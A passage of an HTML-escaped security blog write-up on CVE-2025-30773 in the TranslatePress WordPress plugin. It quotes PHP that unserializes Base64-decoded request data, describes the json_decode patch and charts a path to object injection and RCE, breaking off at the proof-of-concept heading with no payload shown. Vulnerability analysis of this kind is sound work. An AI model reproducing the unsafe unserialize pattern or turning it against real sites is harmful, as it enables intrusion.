&lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.7&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; â†’ &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v2.9.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;trp_update_database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_update_database_capability&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;manage_options&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stop_and_print_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Update&amp;ensp;aborted!&amp;ensp;Your&amp;ensp;user&amp;ensp;account&amp;ensp;doesn\&amp;#39;t&amp;ensp;have&amp;ensp;the&amp;ensp;capability&amp;ensp;to&amp;ensp;perform&amp;ensp;database&amp;ensp;updates.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;translatepress-multilingual&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tpupdatedatabase&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stop_and_print_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Update&amp;ensp;aborted!&amp;ensp;Invalid&amp;ensp;nonce.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;translatepress-multilingual&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extra_params&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_extra_params&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_extra_params&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; is called directly on user-supplied data (&lt;code&gt;$_REQUEST[&#39;trp_updb_extra_params&#39;]&lt;/code&gt; after HTML sanitization and Base64 decode). This creates a serious vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection risk&lt;/strong&gt;: If an attacker provides a PHP object payload encoded in Base64, the decode + unserialize process can initialize a malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potentially &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No safety validation&lt;/strong&gt;: There is no data validation prior to calling &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If data is invalid or malicious, the system lacks graceful handling, increasing risk.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v2.9.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#39; alt=&#34;Diff&#34; height=&#34;278&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; is replaced with &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;By removing &lt;code&gt;unserialize()&lt;/code&gt;, the vulnerability surface is eliminated entirely.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;trp_update_database()&lt;/code&gt; function checks whether the current user is an Administrator via:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_update_database_capability&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;manage_options&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stop_and_print_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Update&amp;ensp;aborted!&amp;ensp;Your&amp;ensp;user&amp;ensp;account&amp;ensp;doesn\&amp;#39;t&amp;ensp;have&amp;ensp;the&amp;ensp;capability&amp;ensp;to&amp;ensp;perform&amp;ensp;database&amp;ensp;updates.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;translatepress-multilingual&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It also verifies a &lt;code&gt;nonce&lt;/code&gt; to prevent CSRF:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;trp_updb_nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tpupdatedatabase&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stop_and_print_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Update&amp;ensp;aborted!&amp;ensp;Invalid&amp;ensp;nonce.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;translatepress-multilingual&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;nonce&lt;/code&gt; is missing, the vulnerability can be exploited unauthenticated by tricking an admin into visiting an attacker-controlled page. The browser will send the request with admin cookies, &lt;code&gt;manage_options&lt;/code&gt; will pass, and backend logic proceeds.&lt;/p&gt;&#xA;&lt;p&gt;Searching for the &lt;code&gt;trp_update_database&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#34; title=&#34;Search result for trp_update_database&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Search result for trp_update_database&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#39; alt=&#34;Search&#34; height=&#34;537&#34; width=&#34;1260&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search result for trp_update_database&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;trp_update_database&lt;/code&gt; is assigned to the &lt;code&gt;page&lt;/code&gt; parameter, meaning it is the callback invoked when visiting &lt;code&gt;/wp-admin/admin.php?page=trp_update_database&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Administrator&amp;ensp;visits&amp;ensp;/wp-admin/admin.php?page=trp_update_database&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;trp_update_database()&amp;ensp;invoked&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C{&#34;Check&amp;ensp;capability:&amp;ensp;current_user_can(manage_options)&#34;}&#xD;&#xA;C&amp;ensp;--&gt;|Fail|&amp;ensp;X[&#34;Stop&amp;ensp;&amp;&amp;ensp;print&amp;ensp;error:&amp;ensp;insufficient&amp;ensp;privilege&#34;]&#xD;&#xA;C&amp;ensp;--&gt;|Pass|&amp;ensp;D[&#34;Verify&amp;ensp;nonce:&amp;ensp;wp_verify_nonce()&#34;]&#xD;&#xA;&#xD;&#xA;D&amp;ensp;--&gt;|Fail|&amp;ensp;Y[&#34;Stop&amp;ensp;&amp;&amp;ensp;print&amp;ensp;error:&amp;ensp;Invalid&amp;ensp;nonce&#34;]&#xD;&#xA;D&amp;ensp;--&gt;|Pass|&amp;ensp;E[&#34;Read&amp;ensp;trp_updb_extra_params&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;base64_decode()&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;unserialize()&#34;]&#xD;&#xA;&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H{&#34;Is&amp;ensp;payload&amp;ensp;malicious?&#34;}&#xD;&#xA;H&amp;ensp;--&gt;|Yes|&amp;ensp;R[&#34;Object&amp;ensp;Injection&amp;ensp;â†’&amp;ensp;Code&amp;ensp;Execution&amp;ensp;(RCE)&#34;]&#xD;&#xA;H&amp;ensp;--&gt;|No|&amp;ensp;S[&#34;Continue&amp;ensp;update&amp;ensp;process&amp;ensp;normally&#34;]&#xD;&#xA;&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 